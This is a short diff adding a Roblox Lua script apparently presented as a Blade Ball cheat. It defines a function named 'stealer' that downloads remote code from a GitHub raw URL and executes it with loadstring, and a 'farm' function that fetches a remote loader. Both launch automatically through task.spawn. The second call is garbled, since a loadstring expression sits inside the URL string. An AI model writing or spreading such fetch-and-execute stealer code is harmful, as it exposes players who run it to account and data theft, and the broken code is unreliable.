@@ -1,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/exortingbitcoin/bladeball/refs/heads/main/allusivefree.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1432c65d5efeb637abfdf3863013744c.lua"))()
+'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
